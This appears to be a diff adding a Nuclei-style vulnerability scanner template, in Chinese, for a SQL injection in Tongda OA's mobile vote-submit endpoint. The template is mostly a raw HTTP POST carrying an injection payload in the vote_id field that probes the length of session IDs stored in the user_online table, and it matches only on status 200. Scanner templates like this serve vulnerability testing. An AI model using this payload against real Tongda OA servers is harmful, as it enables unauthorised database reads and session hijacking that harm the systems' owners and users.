@@ -1,0 +1,39 @@
+id: poc-kdgw8rfy34knl722
+info:
+  name: 通达 OA sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kdgw8rfy34knl722'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kdgw8rfy34knl722
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
+
+
+
+
+    submitData={"a":{"vote_type":"1","vote_id":"if(length((select SID from user_online limit 0,1))=26,1,2*1e308)","value":"1"}}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
